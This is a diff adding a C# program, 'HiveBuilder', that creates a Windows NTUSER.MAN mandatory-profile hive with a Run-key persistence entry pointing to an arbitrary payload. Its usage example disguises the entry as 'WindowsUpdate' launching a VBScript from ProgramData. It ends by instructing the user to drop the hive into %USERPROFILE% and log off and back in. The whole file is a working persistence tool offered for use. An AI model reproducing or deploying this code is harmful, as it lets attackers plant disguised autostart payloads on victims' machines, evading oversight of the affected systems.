@@ -1,1 +1,167 @@
-Testing
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+
+class HiveBuilder
+{
+    [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
+    static extern int OROpenHive(string hivePath, out IntPtr key);
+
+    [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
+    static extern int ORCreateKey(
+        IntPtr handle,
+        string subKey,
+        string Class,
+        uint dwOptions,
+        IntPtr securityDescriptor,
+        out IntPtr newKey,
+        out uint disposition);
+
+    [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
+    static extern int ORSetValue(
+        IntPtr handle,
+        string valueName,
+        uint dwType,
+        byte[] data,
+        uint cbData);
+
+    [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
+    static extern int ORSaveHive(IntPtr key, string hivePath, uint OsMajorVersion, uint OsMinorVersion);
+
+    [DllImport("offreg.dll")]
+    static extern int ORCloseKey(IntPtr key);
+
+    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    static extern int RegLoadAppKey(
+        string lpFile,
+        out IntPtr phkResult,
+        uint samDesired,
+        uint dwOptions,
+        uint Reserved);
+
+    [DllImport("advapi32.dll")]
+    static extern int RegCloseKey(IntPtr hKey);
+
+    const uint REG_KEY_READ = 0x20019;
+    const uint REG_SZ = 1;
+
+    static IntPtr CreateKeyPath(IntPtr hiveHandle, string keyPath)
+    {
+        string[] parts = keyPath.Split('\\');
+        IntPtr currentKey = hiveHandle;
+        IntPtr newKey;
+        uint disposition;
+
+        foreach (string part in parts)
+        {
+            int ret = ORCreateKey(currentKey, part, null, 0, IntPtr.Zero, out newKey, out disposition);
+            if (ret != 0)
+            {
+                Console.WriteLine($"[-] Failed to create key '{part}': 0x{ret:X8}");
+                return IntPtr.Zero;
+            }
+            if (currentKey != hiveHandle) ORCloseKey(currentKey);
+            currentKey = newKey;
+        }
+        return currentKey;
+    }
+
+    static void Main(string[] args)
+    {
+        Console.WriteLine("[*] HiveBuilder starting...");
+        Console.WriteLine($"[*] Args received: {args.Length}");
+
+        if (args.Length < 3)
+        {
+            Console.WriteLine("Usage: HiveBuilder.exe <output_NTUSER.MAN> <payload_path> <key_name>");
+            Console.WriteLine("Example: HiveBuilder.exe NTUSER.MAN \"wscript.exe C:\\ProgramData\\launcher.vbs\" WindowsUpdate");
+            return;
+        }
+
+        string outputHivePath = args[0];
+        string payloadPath    = args[1];
+        string startupKeyName = args[2];
+
+        Console.WriteLine($"[*] Output hive : {outputHivePath}");
+        Console.WriteLine($"[*] Payload     : {payloadPath}");
+        Console.WriteLine($"[*] Key name    : {startupKeyName}");
+
+        // Step 1: Bootstrap a valid empty hive via RegLoadAppKeyW
+        Console.WriteLine("[*] Step 1: Bootstrapping hive via RegLoadAppKeyW...");
+        string bootstrapPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
+
+        IntPtr bootstrapHandle;
+        int result = RegLoadAppKey(bootstrapPath, out bootstrapHandle, REG_KEY_READ, 0, 0);
+        if (result != 0)
+        {
+            Console.WriteLine($"[-] RegLoadAppKeyW failed: 0x{result:X8}");
+            return;
+        }
+        RegCloseKey(bootstrapHandle);
+        Console.WriteLine($"[+] Bootstrap hive created: {bootstrapPath}");
+
+        // Step 2: Open the bootstrapped hive with Offreg.dll
+        Console.WriteLine("[*] Step 2: Opening hive with OROpenHive...");
+        IntPtr hiveHandle;
+        result = OROpenHive(bootstrapPath, out hiveHandle);
+        if (result != 0)
+        {
+            Console.WriteLine($"[-] OROpenHive failed: 0x{result:X8}");
+            try { File.Delete(bootstrapPath); } catch { }
+            return;
+        }
+        Console.WriteLine("[+] Hive opened successfully");
+
+        // Step 3: Create the full key path one level at a time
+        Console.WriteLine("[*] Step 3: Creating key path step by step...");
+        string runKeyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+        IntPtr runKeyHandle = CreateKeyPath(hiveHandle, runKeyPath);
+        if (runKeyHandle == IntPtr.Zero)
+        {
+            ORCloseKey(hiveHandle);
+            try { File.Delete(bootstrapPath); } catch { }
+            return;
+        }
+        Console.WriteLine("[+] Run key path created successfully");
+
+        // Step 4: Set the persistence value
+        Console.WriteLine($"[*] Step 4: Writing value '{startupKeyName}' = '{payloadPath}'...");
+        byte[] valueData = Encoding.Unicode.GetBytes(payloadPath + "\0");
+        result = ORSetValue(runKeyHandle, startupKeyName, REG_SZ, valueData, (uint)valueData.Length);
+        if (result != 0)
+        {
+            Console.WriteLine($"[-] ORSetValue failed: 0x{result:X8}");
+            ORCloseKey(runKeyHandle);
+            ORCloseKey(hiveHandle);
+            try { File.Delete(bootstrapPath); } catch { }
+            return;
+        }
+        Console.WriteLine("[+] Persistence value written");
+        ORCloseKey(runKeyHandle);
+
+        // Step 5: Save the hive
+        Console.WriteLine($"[*] Step 5: Saving hive to {outputHivePath}...");
+
+        // Remove output file if it already exists (ORSaveHive won't overwrite)
+        if (File.Exists(outputHivePath))
+        {
+            File.Delete(outputHivePath);
+            Console.WriteLine("[*] Removed existing output file");
+        }
+
+        result = ORSaveHive(hiveHandle, outputHivePath, 10, 0);
+        ORCloseKey(hiveHandle);
+        try { File.Delete(bootstrapPath); } catch { }
+
+        if (result != 0)
+        {
+            Console.WriteLine($"[-] ORSaveHive failed: 0x{result:X8}");
+            return;
+        }
+
+        Console.WriteLine($"[+] SUCCESS: NTUSER.MAN written to {outputHivePath}");
+        Console.WriteLine($"[+] Payload : {startupKeyName} = {payloadPath}");
+        Console.WriteLine("[*] Copy NTUSER.MAN to %USERPROFILE% then log off and back in");
+    }
+}
